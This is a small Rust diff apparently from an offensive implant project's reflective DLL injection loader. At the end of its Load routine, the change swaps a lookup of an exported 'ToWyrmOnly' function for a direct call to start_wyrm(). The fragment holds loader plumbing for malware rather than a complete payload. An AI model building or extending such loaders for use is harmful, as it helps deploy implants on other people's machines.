@@ -37,7 +37,7 @@ use windows_sys::{
     core::PCSTR,
 };
 
-use crate::utils::export_resolver;
+use crate::{entry::start_wyrm, utils::export_resolver};
 
 //
 // FFI definitions for functions we require for the RDI to work; note these do NOT use evasion techniques such as
@@ -214,11 +214,13 @@ pub unsafe extern "system" fn Load(image_base: *mut c_void) -> u32 {
     //
     // Finally, the the real entrypoint
     //
-    if let Some(exp) = find_export(image_base, p_nt_headers, "ToWyrmOnly") {
-        unsafe {
-            exp();
-        }
-    }
+    // if let Some(exp) = find_export(image_base, p_nt_headers, "ToWyrmOnly") {
+    //     unsafe {
+    //         exp();
+    //     }
+    // }
+
+    start_wyrm();
 
     RdiErrorCodes::Success as _
 }
